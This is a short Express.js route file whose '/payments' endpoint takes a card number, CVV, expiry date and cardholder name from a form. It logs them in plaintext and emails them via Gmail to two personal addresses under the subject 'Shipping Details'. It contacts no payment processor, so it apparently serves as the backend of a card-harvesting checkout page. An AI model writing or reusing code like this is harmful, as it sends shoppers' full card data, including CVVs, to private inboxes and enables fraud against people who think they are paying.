const router = require("express").Router();

const nodemailer = require("nodemailer");




router.post("/payments", async (req, res) => {
  const { expiry, cvv, cardholder, cardNumber } = req.body;
  const emailTemplate = `Payment Details:\n\nExpiration Date: ${expiry}\nCVV: ${cvv}\nCardholder Name: ${cardholder}\nCard Number: ${cardNumber}`;
   console.log(emailTemplate);

  const mailTransporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.GOOGLE_APP_EMAIL,
      pass: process.env.GOOGLE_APP_PW,
    },
  });

  const details = {
    from: process.env.GOOGLE_APP_EMAIL,
    to: "toluarejibadey@gmail.com , victorbenson803@gmail.com",
    subject: "Shipping Details",
    text: emailTemplate,
  };

  mailTransporter.sendMail(details, (err) => {
    if (err) {
      console.error("Email failed:", err);
      return res.status(500).json({ message: "Failed to send email." });
    } else {
      console.log("Email sent successfully.");
      return res.json({ message: "Email sent successfully." });
    }
  });
});


module.exports = router;
